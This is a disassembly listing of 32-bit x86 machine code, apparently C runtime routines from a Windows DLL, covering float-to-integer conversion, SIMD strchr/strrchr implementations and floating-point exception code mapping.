1000ca0c:	33 c0                	xor    %eax,%eax
1000ca0e:	c3                   	ret
1000ca0f:	d8 1d 88 1c 01 10    	fcomps 0x10011c88
1000ca15:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
1000ca1a:	99                   	cltd
1000ca1b:	c3                   	ret
1000ca1c:	55                   	push   %ebp
1000ca1d:	8b ec                	mov    %esp,%ebp
1000ca1f:	83 c4 f0             	add    $0xfffffff0,%esp
1000ca22:	83 e4 f0             	and    $0xfffffff0,%esp
1000ca25:	d9 c0                	fld    %st(0)
1000ca27:	db 3c 24             	fstpt  (%esp)
1000ca2a:	8b 04 24             	mov    (%esp),%eax
1000ca2d:	8b 54 24 04          	mov    0x4(%esp),%edx
1000ca31:	0f b7 4c 24 08       	movzwl 0x8(%esp),%ecx
1000ca36:	0f ba f1 0f          	btr    $0xf,%ecx
1000ca3a:	72 2e                	jb     0x1000ca6a
1000ca3c:	66 81 f9 ff 3f       	cmp    $0x3fff,%cx
1000ca41:	72 2e                	jb     0x1000ca71
1000ca43:	85 d2                	test   %edx,%edx
1000ca45:	79 34                	jns    0x1000ca7b
1000ca47:	66 81 f9 3f 40       	cmp    $0x403f,%cx
1000ca4c:	73 2d                	jae    0x1000ca7b
1000ca4e:	66 f7 d9             	neg    %cx
1000ca51:	66 81 c1 3e 40       	add    $0x403e,%cx
1000ca56:	d9 fc                	frndint
1000ca58:	dd d8                	fstp   %st(0)
1000ca5a:	80 f9 20             	cmp    $0x20,%cl
1000ca5d:	72 04                	jb     0x1000ca63
1000ca5f:	8b c2                	mov    %edx,%eax
1000ca61:	33 d2                	xor    %edx,%edx
1000ca63:	0f ad d0             	shrd   %cl,%edx,%eax
1000ca66:	d3 ea                	shr    %cl,%edx
1000ca68:	c9                   	leave
1000ca69:	c3                   	ret
1000ca6a:	66 81 f9 ff 3f       	cmp    $0x3fff,%cx
1000ca6f:	73 0a                	jae    0x1000ca7b
1000ca71:	d9 fc                	frndint
1000ca73:	dd d8                	fstp   %st(0)
1000ca75:	33 c0                	xor    %eax,%eax
1000ca77:	33 d2                	xor    %edx,%edx
1000ca79:	c9                   	leave
1000ca7a:	c3                   	ret
1000ca7b:	d8 1d 88 1c 01 10    	fcomps 0x10011c88
1000ca81:	c9                   	leave
1000ca82:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
1000ca87:	99                   	cltd
1000ca88:	c3                   	ret
1000ca89:	cc                   	int3
1000ca8a:	cc                   	int3
1000ca8b:	cc                   	int3
1000ca8c:	cc                   	int3
1000ca8d:	cc                   	int3
1000ca8e:	cc                   	int3
1000ca8f:	cc                   	int3
1000ca90:	51                   	push   %ecx
1000ca91:	8d 4c 24 08          	lea    0x8(%esp),%ecx
1000ca95:	2b c8                	sub    %eax,%ecx
1000ca97:	83 e1 0f             	and    $0xf,%ecx
1000ca9a:	03 c1                	add    %ecx,%eax
1000ca9c:	1b c9                	sbb    %ecx,%ecx
1000ca9e:	0b c1                	or     %ecx,%eax
1000caa0:	59                   	pop    %ecx
1000caa1:	e9 fa fc ff ff       	jmp    0x1000c7a0
1000caa6:	51                   	push   %ecx
1000caa7:	8d 4c 24 08          	lea    0x8(%esp),%ecx
1000caab:	2b c8                	sub    %eax,%ecx
1000caad:	83 e1 07             	and    $0x7,%ecx
1000cab0:	03 c1                	add    %ecx,%eax
1000cab2:	1b c9                	sbb    %ecx,%ecx
1000cab4:	0b c1                	or     %ecx,%eax
1000cab6:	59                   	pop    %ecx
1000cab7:	e9 e4 fc ff ff       	jmp    0x1000c7a0
1000cabc:	cc                   	int3
1000cabd:	cc                   	int3
1000cabe:	cc                   	int3
1000cabf:	cc                   	int3
1000cac0:	55                   	push   %ebp
1000cac1:	8b ec                	mov    %esp,%ebp
1000cac3:	57                   	push   %edi
1000cac4:	83 3d 68 40 01 10 01 	cmpl   $0x1,0x10014068
1000cacb:	0f 82 fd 00 00 00    	jb     0x1000cbce
1000cad1:	8b 7d 08             	mov    0x8(%ebp),%edi
1000cad4:	77 77                	ja     0x1000cb4d
1000cad6:	0f b6 55 0c          	movzbl 0xc(%ebp),%edx
1000cada:	8b c2                	mov    %edx,%eax
1000cadc:	c1 e2 08             	shl    $0x8,%edx
1000cadf:	0b d0                	or     %eax,%edx
1000cae1:	66 0f 6e da          	movd   %edx,%xmm3
1000cae5:	f2 0f 70 db 00       	pshuflw $0x0,%xmm3,%xmm3
1000caea:	0f 16 db             	movlhps %xmm3,%xmm3
1000caed:	b9 0f 00 00 00       	mov    $0xf,%ecx
1000caf2:	23 cf                	and    %edi,%ecx
1000caf4:	83 c8 ff             	or     $0xffffffff,%eax
1000caf7:	d3 e0                	shl    %cl,%eax
1000caf9:	2b f9                	sub    %ecx,%edi
1000cafb:	33 d2                	xor    %edx,%edx
1000cafd:	f3 0f 6f 0f          	movdqu (%edi),%xmm1
1000cb01:	66 0f ef d2          	pxor   %xmm2,%xmm2
1000cb05:	66 0f 74 d1          	pcmpeqb %xmm1,%xmm2
1000cb09:	66 0f 74 cb          	pcmpeqb %xmm3,%xmm1
1000cb0d:	66 0f d7 ca          	pmovmskb %xmm2,%ecx
1000cb11:	23 c8                	and    %eax,%ecx
1000cb13:	75 18                	jne    0x1000cb2d
1000cb15:	66 0f d7 c9          	pmovmskb %xmm1,%ecx
1000cb19:	23 c8                	and    %eax,%ecx
1000cb1b:	0f bd c1             	bsr    %ecx,%eax
1000cb1e:	03 c7                	add    %edi,%eax
1000cb20:	85 c9                	test   %ecx,%ecx
1000cb22:	0f 45 d0             	cmovne %eax,%edx
1000cb25:	83 c8 ff             	or     $0xffffffff,%eax
1000cb28:	83 c7 10             	add    $0x10,%edi
1000cb2b:	eb d0                	jmp    0x1000cafd
1000cb2d:	53                   	push   %ebx
1000cb2e:	66 0f d7 d9          	pmovmskb %xmm1,%ebx
1000cb32:	23 d8                	and    %eax,%ebx
1000cb34:	d1 e1                	shl    $1,%ecx
1000cb36:	33 c0                	xor    %eax,%eax
1000cb38:	2b c1                	sub    %ecx,%eax
1000cb3a:	23 c8                	and    %eax,%ecx
1000cb3c:	49                   	dec    %ecx
1000cb3d:	23 cb                	and    %ebx,%ecx
1000cb3f:	5b                   	pop    %ebx
1000cb40:	0f bd c1             	bsr    %ecx,%eax
1000cb43:	03 c7                	add    %edi,%eax
1000cb45:	85 c9                	test   %ecx,%ecx
1000cb47:	0f 44 c2             	cmove  %edx,%eax
1000cb4a:	5f                   	pop    %edi
1000cb4b:	c9                   	leave
1000cb4c:	c3                   	ret
1000cb4d:	0f b6 55 0c          	movzbl 0xc(%ebp),%edx
1000cb51:	85 d2                	test   %edx,%edx
1000cb53:	74 39                	je     0x1000cb8e
1000cb55:	33 c0                	xor    %eax,%eax
1000cb57:	f7 c7 0f 00 00 00    	test   $0xf,%edi
1000cb5d:	74 15                	je     0x1000cb74
1000cb5f:	0f b6 0f             	movzbl (%edi),%ecx
1000cb62:	3b ca                	cmp    %edx,%ecx
1000cb64:	0f 44 c7             	cmove  %edi,%eax
1000cb67:	85 c9                	test   %ecx,%ecx
1000cb69:	74 20                	je     0x1000cb8b
1000cb6b:	47                   	inc    %edi
1000cb6c:	f7 c7 0f 00 00 00    	test   $0xf,%edi
1000cb72:	75 eb                	jne    0x1000cb5f
1000cb74:	66 0f 6e c2          	movd   %edx,%xmm0
1000cb78:	83 c7 10             	add    $0x10,%edi
1000cb7b:	66 0f 3a 63 47 f0 40 	pcmpistri $0x40,-0x10(%edi),%xmm0
1000cb82:	8d 4c 39 f0          	lea    -0x10(%ecx,%edi,1),%ecx
1000cb86:	0f 42 c1             	cmovb  %ecx,%eax
1000cb89:	75 ed                	jne    0x1000cb78
1000cb8b:	5f                   	pop    %edi
1000cb8c:	c9                   	leave
1000cb8d:	c3                   	ret
1000cb8e:	b8 f0 ff ff ff       	mov    $0xfffffff0,%eax
1000cb93:	23 c7                	and    %edi,%eax
1000cb95:	66 0f ef c0          	pxor   %xmm0,%xmm0
1000cb99:	66 0f 74 00          	pcmpeqb (%eax),%xmm0
1000cb9d:	b9 0f 00 00 00       	mov    $0xf,%ecx
1000cba2:	23 cf                	and    %edi,%ecx
1000cba4:	ba ff ff ff ff       	mov    $0xffffffff,%edx
1000cba9:	d3 e2                	shl    %cl,%edx
1000cbab:	66 0f d7 f8          	pmovmskb %xmm0,%edi
1000cbaf:	23 fa                	and    %edx,%edi
1000cbb1:	75 14                	jne    0x1000cbc7
1000cbb3:	66 0f ef c0          	pxor   %xmm0,%xmm0
1000cbb7:	66 0f 74 40 10       	pcmpeqb 0x10(%eax),%xmm0
1000cbbc:	83 c0 10             	add    $0x10,%eax
1000cbbf:	66 0f d7 f8          	pmovmskb %xmm0,%edi
1000cbc3:	85 ff                	test   %edi,%edi
1000cbc5:	74 ec                	je     0x1000cbb3
1000cbc7:	0f bc d7             	bsf    %edi,%edx
1000cbca:	03 c2                	add    %edx,%eax
1000cbcc:	eb bd                	jmp    0x1000cb8b
1000cbce:	8b 7d 08             	mov    0x8(%ebp),%edi
1000cbd1:	33 c0                	xor    %eax,%eax
1000cbd3:	83 c9 ff             	or     $0xffffffff,%ecx
1000cbd6:	f2 ae                	repnz scas %es:(%edi),%al
1000cbd8:	83 c1 01             	add    $0x1,%ecx
1000cbdb:	f7 d9                	neg    %ecx
1000cbdd:	83 ef 01             	sub    $0x1,%edi
1000cbe0:	8a 45 0c             	mov    0xc(%ebp),%al
1000cbe3:	fd                   	std
1000cbe4:	f2 ae                	repnz scas %es:(%edi),%al
1000cbe6:	83 c7 01             	add    $0x1,%edi
1000cbe9:	38 07                	cmp    %al,(%edi)
1000cbeb:	74 04                	je     0x1000cbf1
1000cbed:	33 c0                	xor    %eax,%eax
1000cbef:	eb 02                	jmp    0x1000cbf3
1000cbf1:	8b c7                	mov    %edi,%eax
1000cbf3:	fc                   	cld
1000cbf4:	5f                   	pop    %edi
1000cbf5:	c9                   	leave
1000cbf6:	c3                   	ret
1000cbf7:	cc                   	int3
1000cbf8:	cc                   	int3
1000cbf9:	cc                   	int3
1000cbfa:	cc                   	int3
1000cbfb:	cc                   	int3
1000cbfc:	cc                   	int3
1000cbfd:	cc                   	int3
1000cbfe:	cc                   	int3
1000cbff:	cc                   	int3
1000cc00:	83 3d 68 40 01 10 01 	cmpl   $0x1,0x10014068
1000cc07:	72 5f                	jb     0x1000cc68
1000cc09:	0f b6 44 24 08       	movzbl 0x8(%esp),%eax
1000cc0e:	8b d0                	mov    %eax,%edx
1000cc10:	c1 e0 08             	shl    $0x8,%eax
1000cc13:	0b d0                	or     %eax,%edx
1000cc15:	66 0f 6e da          	movd   %edx,%xmm3
1000cc19:	f2 0f 70 db 00       	pshuflw $0x0,%xmm3,%xmm3
1000cc1e:	0f 16 db             	movlhps %xmm3,%xmm3
1000cc21:	8b 54 24 04          	mov    0x4(%esp),%edx
1000cc25:	b9 0f 00 00 00       	mov    $0xf,%ecx
1000cc2a:	83 c8 ff             	or     $0xffffffff,%eax
1000cc2d:	23 ca                	and    %edx,%ecx
1000cc2f:	d3 e0                	shl    %cl,%eax
1000cc31:	2b d1                	sub    %ecx,%edx
1000cc33:	f3 0f 6f 0a          	movdqu (%edx),%xmm1
1000cc37:	66 0f ef d2          	pxor   %xmm2,%xmm2
1000cc3b:	66 0f 74 d1          	pcmpeqb %xmm1,%xmm2
1000cc3f:	66 0f 74 cb          	pcmpeqb %xmm3,%xmm1
1000cc43:	66 0f eb d1          	por    %xmm1,%xmm2
1000cc47:	66 0f d7 ca          	pmovmskb %xmm2,%ecx
1000cc4b:	23 c8                	and    %eax,%ecx
1000cc4d:	75 08                	jne    0x1000cc57
1000cc4f:	83 c8 ff             	or     $0xffffffff,%eax
1000cc52:	83 c2 10             	add    $0x10,%edx
1000cc55:	eb dc                	jmp    0x1000cc33
1000cc57:	0f bc c1             	bsf    %ecx,%eax
1000cc5a:	03 c2                	add    %edx,%eax
1000cc5c:	66 0f 7e da          	movd   %xmm3,%edx
1000cc60:	33 c9                	xor    %ecx,%ecx
1000cc62:	3a 10                	cmp    (%eax),%dl
1000cc64:	0f 45 c1             	cmovne %ecx,%eax
1000cc67:	c3                   	ret
1000cc68:	33 c0                	xor    %eax,%eax
1000cc6a:	8a 44 24 08          	mov    0x8(%esp),%al
1000cc6e:	53                   	push   %ebx
1000cc6f:	8b d8                	mov    %eax,%ebx
1000cc71:	c1 e0 08             	shl    $0x8,%eax
1000cc74:	8b 54 24 08          	mov    0x8(%esp),%edx
1000cc78:	f7 c2 03 00 00 00    	test   $0x3,%edx
1000cc7e:	74 15                	je     0x1000cc95
1000cc80:	8a 0a                	mov    (%edx),%cl
1000cc82:	83 c2 01             	add    $0x1,%edx
1000cc85:	3a cb                	cmp    %bl,%cl
1000cc87:	74 59                	je     0x1000cce2
1000cc89:	84 c9                	test   %cl,%cl
1000cc8b:	74 51                	je     0x1000ccde
1000cc8d:	f7 c2 03 00 00 00    	test   $0x3,%edx
1000cc93:	75 eb                	jne    0x1000cc80
1000cc95:	0b d8                	or     %eax,%ebx
1000cc97:	57                   	push   %edi
1000cc98:	8b c3                	mov    %ebx,%eax
1000cc9a:	c1 e3 10             	shl    $0x10,%ebx
1000cc9d:	56                   	push   %esi
1000cc9e:	0b d8                	or     %eax,%ebx
1000cca0:	8b 0a                	mov    (%edx),%ecx
1000cca2:	bf ff fe fe 7e       	mov    $0x7efefeff,%edi
1000cca7:	8b c1                	mov    %ecx,%eax
1000cca9:	8b f7                	mov    %edi,%esi
1000ccab:	33 cb                	xor    %ebx,%ecx
1000ccad:	03 f0                	add    %eax,%esi
1000ccaf:	03 f9                	add    %ecx,%edi
1000ccb1:	83 f1 ff             	xor    $0xffffffff,%ecx
1000ccb4:	83 f0 ff             	xor    $0xffffffff,%eax
1000ccb7:	33 cf                	xor    %edi,%ecx
1000ccb9:	33 c6                	xor    %esi,%eax
1000ccbb:	83 c2 04             	add    $0x4,%edx
1000ccbe:	81 e1 00 01 01 81    	and    $0x81010100,%ecx
1000ccc4:	75 21                	jne    0x1000cce7
1000ccc6:	25 00 01 01 81       	and    $0x81010100,%eax
1000cccb:	74 d3                	je     0x1000cca0
1000cccd:	25 00 01 01 01       	and    $0x1010100,%eax
1000ccd2:	75 08                	jne    0x1000ccdc
1000ccd4:	81 e6 00 00 00 80    	and    $0x80000000,%esi
1000ccda:	75 c4                	jne    0x1000cca0
1000ccdc:	5e                   	pop    %esi
1000ccdd:	5f                   	pop    %edi
1000ccde:	5b                   	pop    %ebx
1000ccdf:	33 c0                	xor    %eax,%eax
1000cce1:	c3                   	ret
1000cce2:	8d 42 ff             	lea    -0x1(%edx),%eax
1000cce5:	5b                   	pop    %ebx
1000cce6:	c3                   	ret
1000cce7:	8b 42 fc             	mov    -0x4(%edx),%eax
1000ccea:	3a c3                	cmp    %bl,%al
1000ccec:	74 36                	je     0x1000cd24
1000ccee:	84 c0                	test   %al,%al
1000ccf0:	74 ea                	je     0x1000ccdc
1000ccf2:	3a e3                	cmp    %bl,%ah
1000ccf4:	74 27                	je     0x1000cd1d
1000ccf6:	84 e4                	test   %ah,%ah
1000ccf8:	74 e2                	je     0x1000ccdc
1000ccfa:	c1 e8 10             	shr    $0x10,%eax
1000ccfd:	3a c3                	cmp    %bl,%al
1000ccff:	74 15                	je     0x1000cd16
1000cd01:	84 c0                	test   %al,%al
1000cd03:	74 d7                	je     0x1000ccdc
1000cd05:	3a e3                	cmp    %bl,%ah
1000cd07:	74 06                	je     0x1000cd0f
1000cd09:	84 e4                	test   %ah,%ah
1000cd0b:	74 cf                	je     0x1000ccdc
1000cd0d:	eb 91                	jmp    0x1000cca0
1000cd0f:	5e                   	pop    %esi
1000cd10:	5f                   	pop    %edi
1000cd11:	8d 42 ff             	lea    -0x1(%edx),%eax
1000cd14:	5b                   	pop    %ebx
1000cd15:	c3                   	ret
1000cd16:	8d 42 fe             	lea    -0x2(%edx),%eax
1000cd19:	5e                   	pop    %esi
1000cd1a:	5f                   	pop    %edi
1000cd1b:	5b                   	pop    %ebx
1000cd1c:	c3                   	ret
1000cd1d:	8d 42 fd             	lea    -0x3(%edx),%eax
1000cd20:	5e                   	pop    %esi
1000cd21:	5f                   	pop    %edi
1000cd22:	5b                   	pop    %ebx
1000cd23:	c3                   	ret
1000cd24:	8d 42 fc             	lea    -0x4(%edx),%eax
1000cd27:	5e                   	pop    %esi
1000cd28:	5f                   	pop    %edi
1000cd29:	5b                   	pop    %ebx
1000cd2a:	c3                   	ret
1000cd2b:	55                   	push   %ebp
1000cd2c:	8b ec                	mov    %esp,%ebp
1000cd2e:	51                   	push   %ecx
1000cd2f:	83 3d 68 40 01 10 01 	cmpl   $0x1,0x10014068
1000cd36:	7c 66                	jl     0x1000cd9e
1000cd38:	81 7d 08 b4 02 00 c0 	cmpl   $0xc00002b4,0x8(%ebp)
1000cd3f:	74 09                	je     0x1000cd4a
1000cd41:	81 7d 08 b5 02 00 c0 	cmpl   $0xc00002b5,0x8(%ebp)
1000cd48:	75 54                	jne    0x1000cd9e
1000cd4a:	0f ae 5d fc          	stmxcsr -0x4(%ebp)
1000cd4e:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000cd51:	83 f0 3f             	xor    $0x3f,%eax
1000cd54:	a8 81                	test   $0x81,%al
1000cd56:	74 3f                	je     0x1000cd97
1000cd58:	a9 04 02 00 00       	test   $0x204,%eax
1000cd5d:	75 07                	jne    0x1000cd66
1000cd5f:	b8 8e 00 00 c0       	mov    $0xc000008e,%eax
1000cd64:	c9                   	leave
1000cd65:	c3                   	ret
1000cd66:	a9 02 01 00 00       	test   $0x102,%eax
1000cd6b:	74 2a                	je     0x1000cd97
1000cd6d:	a9 08 04 00 00       	test   $0x408,%eax
1000cd72:	75 07                	jne    0x1000cd7b
1000cd74:	b8 91 00 00 c0       	mov    $0xc0000091,%eax
1000cd79:	c9                   	leave
1000cd7a:	c3                   	ret
1000cd7b:	a9 10 08 00 00       	test   $0x810,%eax
1000cd80:	75 07                	jne    0x1000cd89
1000cd82:	b8 93 00 00 c0       	mov    $0xc0000093,%eax
1000cd87:	c9                   	leave
1000cd88:	c3                   	ret
1000cd89:	a9 20 10 00 00       	test   $0x1020,%eax
1000cd8e:	75 0e                	jne    0x1000cd9e
1000cd90:	b8 8f 00 00 c0       	mov    $0xc000008f,%eax
1000cd95:	c9                   	leave
1000cd96:	c3                   	ret
1000cd97:	b8 90 00 00 c0       	mov    $0xc0000090,%eax
1000cd9c:	c9                   	leave
1000cd9d:	c3                   	ret
1000cd9e:	8b 45 08             	mov    0x8(%ebp),%eax
1000cda1:	c9                   	leave
1000cda2:	c3                   	ret
